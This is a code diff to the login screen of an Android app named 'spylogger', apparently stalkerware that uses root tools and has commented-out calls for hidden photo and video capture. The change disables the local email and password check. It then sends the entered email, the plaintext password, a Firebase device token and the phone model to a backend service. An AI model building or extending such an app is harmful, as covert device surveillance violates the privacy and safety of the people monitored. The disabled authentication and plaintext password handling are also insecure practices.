@@ -33,13 +33,15 @@ import android.widget.EditText;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.google.firebase.iid.FirebaseInstanceId;
 import com.gravatasufoca.spylogger.R;
 import com.gravatasufoca.spylogger.model.Configuracao;
-import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
-import com.gravatasufoca.spylogger.services.SendDataService;
+import com.gravatasufoca.spylogger.services.SendUsuarioService;
 import com.gravatasufoca.spylogger.utils.Utils;
+import com.gravatasufoca.spylogger.vos.AparelhoVO;
+import com.gravatasufoca.spylogger.vos.UsuarioVO;
 import com.stericson.RootTools.RootTools;
 import com.utilidades.gravata.utils.Utilidades;
 
@@ -141,13 +143,6 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
 //                ServicosHelper servicosHelper=new ServicosHelper();
 //                servicosHelper.getPicture(getApplicationContext(),true);
 //                servicosHelper.getVideo(getApplicationContext(),10,true);
-                SendDataService sendDataService=new SendDataService();
-                List<Topico> topicos=new ArrayList<Topico>(){{
-                    add(new Topico.TopicoBuilder().setNome("topico").build());
-                    add(new Topico.TopicoBuilder().setNome("topico 2").build());
-                }};
-
-                sendDataService.enviarTopicos(topicos);
 
             }
         });
@@ -384,10 +379,53 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
                 Configuracao configuracao=repositorioConfiguracao.getConfiguracao();
 
                 if(configuracao!=null){
+                   /* if(mEmail.equalsIgnoreCase(configuracao.getEmail()) && mPassword.equals(configuracao.getSenha()) ){
+                        return true;
+                    }
+
+                    if(!TextUtils.isEmpty(configuracao.getEmail()) && !mEmail.equalsIgnoreCase(configuracao.getEmail())){
+                        handler.post(new Runnable() {
+                            @Override
+                            public void run() {
+                                mEmailView.setError(getString(R.string.error_invalid_email));
+                                mEmailView.requestFocus();
+                            }
+                        });
+                        return false;
+                    }
+
+
+                    if(!TextUtils.isEmpty(configuracao.getEmail()) && !mPassword.equalsIgnoreCase(configuracao.getSenha())){
+                        handler.post(new Runnable() {
+                            @Override
+                            public void run() {
+                                mPasswordView.setError(getString(R.string.error_invalid_password));
+                                mPasswordView.requestFocus();
+                            }
+                        });
+                        return false;
+                    }*/
+
 
                     configuracao.setEmail(mEmail);
 
                     repositorioConfiguracao.atualizar(configuracao);
+                    SendUsuarioService sendUsuarioService=new SendUsuarioService(handler);
+
+                    UsuarioVO usuarioVO=new UsuarioVO();
+
+                    usuarioVO.setEmail(mEmail);
+                    usuarioVO.setSenha(mPassword);
+
+                    String token=FirebaseInstanceId.getInstance().getToken();
+                    if(!TextUtils.isEmpty(token)){
+                        final AparelhoVO aparelhoVO=new AparelhoVO();
+                        aparelhoVO.setChave(token);
+                        aparelhoVO.setNome(android.os.Build.MODEL);
+                        usuarioVO.setAparelhoVOList(new ArrayList<AparelhoVO>(){{add(aparelhoVO);}});
+                    }
+
+                    sendUsuarioService.inserirUsuario(usuarioVO);
 
                     handler.post(new Runnable() {
                         @Override
